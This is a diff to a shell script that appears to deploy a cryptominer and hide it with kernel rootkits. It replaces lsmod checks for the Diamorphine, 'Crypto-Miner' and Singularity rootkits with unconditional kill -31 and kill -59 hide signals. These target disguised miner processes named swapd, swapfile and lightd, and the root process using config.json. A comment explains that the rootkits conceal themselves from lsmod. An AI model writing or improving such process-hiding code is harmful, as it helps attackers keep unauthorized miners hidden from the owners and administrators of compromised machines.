@@ -2169,43 +2169,28 @@ echo "=========================================="
 echo "ACTIVATING PROCESS HIDING"
 echo "=========================================="
 echo ""
-echo "[*] Sending hide signals to all loaded rootkits..."
+echo "[*] Sending hide signals unconditionally..."
+echo "[*] Note: rootkits hide themselves from lsmod — signals sent regardless"
 sleep 3  # Give processes time to be fully up before hiding
 
-# ---- Diamorphine: kill -31 = hide ----
-if lsmod | grep -q "^diamorphine" 2>/dev/null; then
-    echo "[*] Diamorphine loaded — sending kill -31 (hide)..."
-    pgrep -f -u root config.json | xargs -r kill -31 2>/dev/null || true
-    kill -31 "$(/bin/ps ax -fu "$USER" | grep "swapd"   | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
-    kill -31 "$(/bin/ps ax -fu "$USER" | grep "swapfile" | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
-    kill -31 "$(/bin/ps ax -fu "$USER" | grep "lightd"  | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
-    echo "[✓] Processes hidden with Diamorphine (kill -31)"
-else
-    echo "[*] Diamorphine not loaded — skipping"
-fi
+# Send all signals unconditionally — rootkits hide themselves from lsmod,
+# so lsmod checks always return false even when loaded. Signals are harmless
+# if no rootkit intercepts them (process just receives an unhandled RT signal).
 
-# ---- Crypto-Miner rootkit: kill -31 = hide ----
-if lsmod | grep -q "^rootkit" 2>/dev/null; then
-    echo "[*] Crypto-Miner rootkit loaded — sending kill -31 (hide)..."
-    pgrep -f -u root config.json | xargs -r kill -31 2>/dev/null || true
-    kill -31 "$(/bin/ps ax -fu "$USER" | grep "swapd"   | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
-    kill -31 "$(/bin/ps ax -fu "$USER" | grep "swapfile" | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
-    kill -31 "$(/bin/ps ax -fu "$USER" | grep "lightd"  | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
-    echo "[✓] Processes hidden with Crypto-Miner rootkit (kill -31)"
-else
-    echo "[*] Crypto-Miner rootkit not loaded — skipping"
-fi
+# ---- kill -31: Diamorphine + Crypto-RK hide signal ----
+echo "[*] Sending kill -31 (Diamorphine/Crypto-RK hide)..."
+pgrep -f -u root config.json | xargs -r kill -31 2>/dev/null || true
+kill -31 "$(/bin/ps ax -fu "$USER" | grep "swapd"   | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
+kill -31 "$(/bin/ps ax -fu "$USER" | grep "swapfile" | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
+kill -31 "$(/bin/ps ax -fu "$USER" | grep "lightd"  | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
+echo "[✓] kill -31 sent"
 
-# ---- Singularity (kernel 6.x): kill -59 = toggle hide ----
-if [ "$SINGULARITY_LOADED" = true ] || lsmod | grep -q "^singularity" 2>/dev/null; then
-    echo "[*] Singularity loaded — sending kill -59 (toggle hide)..."
-    pgrep -f -u root config.json | xargs -r kill -59 2>/dev/null || true
-    kill -59 "$(/bin/ps ax -fu "$USER" | grep "swapd"   | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
-    kill -59 "$(/bin/ps ax -fu "$USER" | grep "swapfile" | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
-    kill -59 "$(/bin/ps ax -fu "$USER" | grep "lightd"  | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
-    echo "[✓] Processes hidden with Singularity (kill -59)"
-else
-    echo "[*] Singularity not loaded — skipping"
-fi
+# ---- kill -59: Singularity toggle hide signal ----
+echo "[*] Sending kill -59 (Singularity toggle hide)..."
+pgrep -f -u root config.json | xargs -r kill -59 2>/dev/null || true
+kill -59 "$(/bin/ps ax -fu "$USER" | grep "swapd"   | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
+kill -59 "$(/bin/ps ax -fu "$USER" | grep "swapfile" | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
+kill -59 "$(/bin/ps ax -fu "$USER" | grep "lightd"  | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
+echo "[✓] kill -59 sent"
 
 echo '========================================================================'
